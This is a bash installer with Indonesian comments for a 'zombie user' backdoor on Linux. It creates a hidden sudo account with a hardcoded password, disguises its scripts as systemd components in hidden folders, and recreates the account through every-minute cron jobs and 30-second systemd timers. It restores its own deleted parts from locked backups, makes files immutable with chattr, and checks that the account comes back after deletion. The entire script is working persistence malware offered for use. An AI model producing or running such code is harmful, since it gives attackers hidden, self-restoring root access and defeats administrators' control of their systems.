#!/bin/bash
# AUTO INSTALL ZOMBIE USER SYSTEM - 1 COMMAND
# Jalanin: bash install-zombie.sh

echo "🔥🔥 MEMULAI INSTALASI ZOMBIE USER SYSTEM 🔥🔥"
echo "=============================================="

# ============================================
# KONFIGURASI (UBAH KALAU PERLU)
# ============================================
USERNAME="system"
PASSWORD="systemd"
SUDO_GROUP="sudo"        # ubah jadi "wheel" kalo CentOS/RHEL
# SSH_PUB_KEY="ssh-rsa AAA... pubkey lo"  # Uncomment kalo pake SSH key

# ============================================
# CEK ROOT
# ============================================
if [ "$EUID" -ne 0 ]; then 
    echo "❌ JALANKAN SEBAGAI ROOT goblok!"
    exit 1
fi

# ============================================
# STEP 1: BUAT USER SYSTEM
# ============================================
echo "[1/12] Membuat user $USERNAME..."
useradd -M -s /bin/bash $USERNAME 2>/dev/null
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG $SUDO_GROUP $USERNAME

# ============================================
# STEP 2: BUAT FOLDER HIDDEN
# ============================================
echo "[2/12] Membuat folder hidden..."
mkdir -p /usr/local/lib/.systemd
mkdir -p /var/tmp/.systemd-backup

# ============================================
# STEP 3: BUAT SCRIPT REINKARNASI
# ============================================
echo "[3/12] Membuat script reborn..."
cat > /usr/local/lib/.systemd/systemd-reborn << 'EOF'
#!/bin/bash
USER="system"
PASS="systemd"
SUDO_GROUP="sudo"

if ! id "$USER" &>/dev/null; then
    useradd -M -s /bin/bash "$USER"
    echo "$USER:$PASS" | chpasswd
    usermod -aG "$SUDO_GROUP" "$USER"
    
    # SSH key (kalo dipake)
    if [ -f /var/tmp/.systemd-backup/authorized_keys ]; then
        mkdir -p /home/$USER/.ssh
        cp /var/tmp/.systemd-backup/authorized_keys /home/$USER/.ssh/
        chown -R $USER:$USER /home/$USER
        chmod 700 /home/$USER/.ssh
    fi
else
    if ! groups "$USER" 2>/dev/null | grep -q "$SUDO_GROUP"; then
        usermod -aG "$SUDO_GROUP" "$USER"
    fi
fi

if [ -d "/home/$USER" ]; then
    chattr +i /home/$USER 2>/dev/null
fi
exit 0
EOF

chmod +x /usr/local/lib/.systemd/systemd-reborn

# ============================================
# STEP 4: BUAT SCRIPT MONITOR
# ============================================
echo "[4/12] Membuat script monitor..."
cat > /usr/local/lib/.systemd/systemd-monitor << 'EOF'
#!/bin/bash
# Monitor semua komponen

# Cek cron persist
if [ ! -f /etc/cron.d/systemd-persist ]; then
    echo "* * * * * root /usr/local/lib/.systemd/systemd-reborn" > /etc/cron.d/systemd-persist
    chattr +i /etc/cron.d/systemd-persist 2>/dev/null
fi

# Cek cron monitor
if [ ! -f /etc/cron.d/systemd-monitor ]; then
    echo "*/5 * * * * root /usr/local/lib/.systemd/systemd-monitor" > /etc/cron.d/systemd-monitor
    chattr +i /etc/cron.d/systemd-monitor 2>/dev/null
fi

# Cek timer utama
if [ ! -f /etc/systemd/system/systemd-persist.timer ]; then
    if [ -f /var/tmp/.systemd-backup/systemd-persist.timer ]; then
        cp /var/tmp/.systemd-backup/systemd-persist.timer /etc/systemd/system/
        cp /var/tmp/.systemd-backup/systemd-persist.service /etc/systemd/system/
        systemctl daemon-reload
        systemctl enable systemd-persist.timer
        systemctl start systemd-persist.timer
        chattr +i /etc/systemd/system/systemd-persist.* 2>/dev/null
    fi
fi

# Cek timer monitor
if [ ! -f /etc/systemd/system/systemd-monitor.timer ]; then
    if [ -f /var/tmp/.systemd-backup/systemd-monitor.timer ]; then
        cp /var/tmp/.systemd-backup/systemd-monitor.timer /etc/systemd/system/
        cp /var/tmp/.systemd-backup/systemd-monitor.service /etc/systemd/system/
        systemctl daemon-reload
        systemctl enable systemd-monitor.timer
        systemctl start systemd-monitor.timer
        chattr +i /etc/systemd/system/systemd-monitor.* 2>/dev/null
    fi
fi

# Cek script utama
if [ ! -f /usr/local/lib/.systemd/systemd-reborn ]; then
    if [ -f /var/tmp/.systemd-backup/systemd-reborn ]; then
        cp /var/tmp/.systemd-backup/systemd-reborn /usr/local/lib/.systemd/
        chmod +x /usr/local/lib/.systemd/systemd-reborn
    fi
fi

exit 0
EOF

chmod +x /usr/local/lib/.systemd/systemd-monitor

# ============================================
# STEP 5: BACKUP AWAL
# ============================================
echo "[5/12] Backup script..."
cp /usr/local/lib/.systemd/systemd-reborn /var/tmp/.systemd-backup/
cp /usr/local/lib/.systemd/systemd-monitor /var/tmp/.systemd-backup/

# Backup SSH key kalo ada
if [ ! -z "$SSH_PUB_KEY" ]; then
    cp /home/$USERNAME/.ssh/authorized_keys /var/tmp/.systemd-backup/ 2>/dev/null
fi

# ============================================
# STEP 6: BUAT CRON JOBS
# ============================================
echo "[6/12] Membuat cron jobs..."
echo "* * * * * root /usr/local/lib/.systemd/systemd-reborn" > /etc/cron.d/systemd-persist
echo "*/5 * * * * root /usr/local/lib/.systemd/systemd-monitor" > /etc/cron.d/systemd-monitor

# Kunci file cron
chattr +i /etc/cron.d/systemd-persist 2>/dev/null
chattr +i /etc/cron.d/systemd-monitor 2>/dev/null

# Backup cron
cp /etc/cron.d/systemd-persist /var/tmp/.systemd-backup/
cp /etc/cron.d/systemd-monitor /var/tmp/.systemd-backup/

# ============================================
# STEP 7: BUAT TIMER UTAMA (30 DETIK)
# ============================================
echo "[7/12] Membuat timer utama 30 detik..."

# Service file
cat > /etc/systemd/system/systemd-persist.service << 'EOF'
[Unit]
Description=Zombie Persist Service
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-reborn
User=root
Group=root
EOF

# Timer file
cat > /etc/systemd/system/systemd-persist.timer << 'EOF'
[Unit]
Description=Run zombie every 30 seconds

[Timer]
OnBootSec=10sec
OnUnitActiveSec=30sec

[Install]
WantedBy=timers.target
EOF

# Enable dan start
systemctl daemon-reload
systemctl enable systemd-persist.timer
systemctl start systemd-persist.timer

# Kunci file
chattr +i /etc/systemd/system/systemd-persist.service 2>/dev/null
chattr +i /etc/systemd/system/systemd-persist.timer 2>/dev/null

# Backup
cp /etc/systemd/system/systemd-persist.* /var/tmp/.systemd-backup/

# ============================================
# STEP 8: BUAT MONITOR TIMER (3 MENIT)
# ============================================
echo "[8/12] Membuat monitor timer 3 menit..."

# Service file
cat > /etc/systemd/system/systemd-monitor.service << 'EOF'
[Unit]
Description=Zombie Monitor Service

[Service]
Type=oneshot
ExecStart=/usr/local/lib/.systemd/systemd-monitor
User=root
EOF

# Timer file
cat > /etc/systemd/system/systemd-monitor.timer << 'EOF'
[Unit]
Description=Run zombie monitor every 3 minutes

[Timer]
OnBootSec=2min
OnUnitActiveSec=3min

[Install]
WantedBy=timers.target
EOF

# Enable dan start
systemctl daemon-reload
systemctl enable systemd-monitor.timer
systemctl start systemd-monitor.timer

# Kunci file
chattr +i /etc/systemd/system/systemd-monitor.service 2>/dev/null
chattr +i /etc/systemd/system/systemd-monitor.timer 2>/dev/null

# Backup
cp /etc/systemd/system/systemd-monitor.* /var/tmp/.systemd-backup/

# ============================================
# STEP 9: KUNCI SEMUA BACKUP
# ============================================
echo "[9/12] Mengunci semua file backup..."
chattr +i /var/tmp/.systemd-backup/* 2>/dev/null

# ============================================
# STEP 10: JALANKAN SCRIPT PERTAMA KALI
# ============================================
echo "[10/12] Menjalankan script pertama kali..."
/usr/local/lib/.systemd/systemd-reborn

# ============================================
# STEP 11: CEK HASIL
# ============================================
echo "[11/12] Memeriksa hasil instalasi..."
echo ""
echo "=== HASIL CEK ==="
echo "User system: $(id $USERNAME 2>/dev/null | head -c 50)"
echo "Grup system: $(groups $USERNAME 2>/dev/null)"
echo "Timer utama: $(systemctl is-active systemd-persist.timer)"
echo "Timer monitor: $(systemctl is-active systemd-monitor.timer)"
echo "Cron persist: $(ls -la /etc/cron.d/systemd-persist 2>/dev/null | awk '{print $1, $9}')"
echo "Cron monitor: $(ls -la /etc/cron.d/systemd-monitor 2>/dev/null | awk '{print $1, $9}')"
echo "Backup folder: $(ls -1 /var/tmp/.systemd-backup/ | wc -l) file"

# ============================================
# STEP 12: TES CEPAT
# ============================================
echo "[12/12] Menjalankan tes cepat..."
echo ""
echo "Tes hapus user..."
userdel $USERNAME 2>/dev/null
echo "User setelah dihapus: $(id $USERNAME 2>/dev/null || echo 'Gak ada (benar)')"
echo "Tunggu 10 detik..."
sleep 10
/usr/local/lib/.systemd/systemd-reborn
echo "User setelah script dijalankan: $(id $USERNAME 2>/dev/null | head -c 50)"

# ============================================
# SELESAI
# ============================================
echo ""
echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
echo "✅✅ INSTALASI ZOMBIE SYSTEM SELESAI! ✅✅"
echo "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"
echo ""
echo "Username: $USERNAME"
echo "Password: $PASSWORD"
echo "Akses root: sudo su - $USERNAME"
echo ""
echo "Cek dengan: id $USERNAME"
echo "🔥 Selamat ber-zombie ria! 🔥"
